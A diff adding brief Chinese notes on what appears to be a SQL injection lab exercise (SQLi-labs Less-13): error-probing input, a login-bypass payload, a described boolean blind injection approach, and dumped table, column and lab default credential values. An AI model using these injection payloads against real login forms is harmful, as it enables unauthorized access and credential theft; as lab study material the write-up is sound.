@@ -1,0 +1,15 @@
+uname='admin&passwd=123&submit=Submit
+报错' admin') and password=('123') LIMIT 0,1 '
+猜测sql：select uname,passwd from 表 where uname = ('输入的uname') and password = ('输入的passwd') limit0,1
+
+uname=admin') --+&passwd=123&submit=Submit
+但我们注意到本题与Less11、12的区别是，本题登录成功后，并不会返回用户名和密码，只能用<img src="../images/flag.jpg"   />来区分是否登录成功，登录成功是显示的是flag.jpg，登录失败显示的是slap.jpg
+
+编写脚本，采用基于布尔值盲注的方法，根据响应内容有无flag.jpg来判断
+爆出表名：
+result: users,uagents,emails,referers
+爆出字段名：
+result: id,username,password,user,current_connections,total_connections
+爆出字段值：
+result: dumb:dumb,angelina:i-kill-you,dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+
